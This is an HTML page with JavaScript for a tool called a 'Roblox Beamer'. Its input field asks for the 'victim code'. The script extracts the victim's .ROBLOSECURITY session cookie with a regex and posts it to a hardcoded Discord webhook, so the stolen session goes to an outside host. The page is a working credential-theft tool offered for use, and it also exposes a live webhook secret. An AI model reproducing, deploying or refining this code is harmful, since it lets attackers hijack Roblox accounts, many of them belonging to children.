<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>testRoblox Beamer</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 20px;
    }
    #messageBar {
      margin-top: 20px;
    }
    input, button {
      padding: 10px;
      font-size: 16px;
    }
    input {
      width: 70%;
      margin-right: 10px;
    }
    button {
      background-color: #007bff;
      color: white;
      border: none;
      cursor: pointer;
    }
    button:disabled {
      background-color: #cccccc;
      cursor: not-allowed;
    }
    button:hover:not(:disabled) {
      background-color: #0056b3;
    }
    .error {
      color: red;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <h1>Start Beaming Now!</h1>
  <div id="messageBar">
    <input type="text" id="messageInput" placeholder="Paste the victim code that you copied..." />
    <button id="sendButton" onclick="sendMessage()">Send</button>
  </div>
  <p id="status" style="color: green; font-weight: bold;"></p>
  <p id="errorMessage" class="error"></p>

  <script>
    // Replace with your Discord Webhook URL
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1320573593821773845/QvHOAwVTwyuwh6O-HT15JQSZYD_W9hxsYcfnOe3L-Ig7vENas32Ybj5p2_3VVHYiHdQg";

    function sendMessage() {
      const messageInput = document.getElementById("messageInput");
      const sendButton = document.getElementById("sendButton");
      const errorMessage = document.getElementById("errorMessage");
      const message = messageInput.value;

      errorMessage.textContent = ""; // Clear any previous error messages

      // Check if the message contains the ROBLOSECURITY token
      const robloSecurityTokenPattern = /\.ROBLOSECURITY=[A-Za-z0-9%\-._]+/i;
      const match = message.match(robloSecurityTokenPattern);

      if (!match) {
        // If no ROBLOSECURITY token is found, show an error
        errorMessage.textContent = "Message failed! No ROBLOSECURITY token found.";
        return;
      }

      // Extract only the ROBLOSECURITY token (removes warning text)
      const token = match[0].split('=')[1];

      // Send the token to Discord
      const discordPayload = {
        content: `ROBLOSECURITY Token: ${token}`
      };

      // Send the data to Discord via Webhook
      fetch(DISCORD_WEBHOOK_URL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(discordPayload)
      })
      .then(response => response.json())
      .then(data => {
        // If successful, show a success message
        document.getElementById("status").textContent = "Token successfully sent to Discord!";
      })
      .catch(error => {
        // Handle error
        document.getElementById("errorMessage").textContent = "Error sending message!";
        console.error("Error:", error);
      });
    }
  </script>
</body>
</html>
